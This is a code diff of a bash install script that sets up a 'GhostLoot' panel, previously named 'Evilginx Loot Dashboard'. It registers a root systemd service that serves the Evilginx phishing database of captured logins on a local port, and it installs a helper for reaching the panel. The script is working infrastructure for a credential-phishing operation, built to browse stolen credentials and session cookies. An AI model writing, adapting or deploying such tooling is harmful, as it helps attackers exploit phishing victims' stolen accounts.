@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-# Instala el Evilginx Loot Dashboard como servicio systemd.
-# Uso: sudo ./install.sh
+# Install GhostLoot panel as systemd + the VPS helper.
+# Usage: sudo ./install.sh
 set -euo pipefail
 
 DEST=/opt/evilginx-dashboard
@@ -13,20 +13,34 @@ fi
 mkdir -p "$DEST"
 cp evilginx-dashboard "$DEST/"
 chmod +x "$DEST/evilginx-dashboard"
-cp evilginx-dashboard.service /etc/systemd/system/evilginx-dashboard.service
+
+cat >/etc/systemd/system/ghostloot.service <<EOF
+[Unit]
+Description=GhostLoot panel (127.0.0.1:8090)
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=${DEST}/evilginx-dashboard -addr 127.0.0.1:8090 -db /root/.evilginx/data.db
+Restart=on-failure
+RestartSec=2
+User=root
+NoNewPrivileges=true
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+install -m 0755 ghostloot-host.sh /usr/local/bin/ghostloot-host
 
 systemctl daemon-reload
-systemctl enable --now evilginx-dashboard
+systemctl enable --now ghostloot
 
 echo
-echo "Instalado y arrancado. Estado:"
-systemctl status evilginx-dashboard --no-pager | head -6 || true
+echo "Panel en 127.0.0.1:8090 (solo local). Desde el portátil:"
+echo "  ghostloot"
 echo
-echo "Escucha en 127.0.0.1:8090 (solo local). Para verlo desde tu equipo:"
-echo "  ssh -i <clave> -L 8090:127.0.0.1:8090 <user>@<host>"
-echo "  y abre http://localhost:8090"
-echo "  (si cierras el panel: ./ghostloot-tunnel.sh — no mata un túnel existente)"
-echo
-echo "Logs:    journalctl -u evilginx-dashboard -f"
-echo "Parar:   systemctl stop evilginx-dashboard"
-echo "Actualizar: copia el binario nuevo a $DEST y 'systemctl restart evilginx-dashboard'"
+echo "Logs:    journalctl -u ghostloot -f"
+echo "Parar:   systemctl stop ghostloot"
+echo "Update:  copia el binario a $DEST y 'systemctl restart ghostloot'"
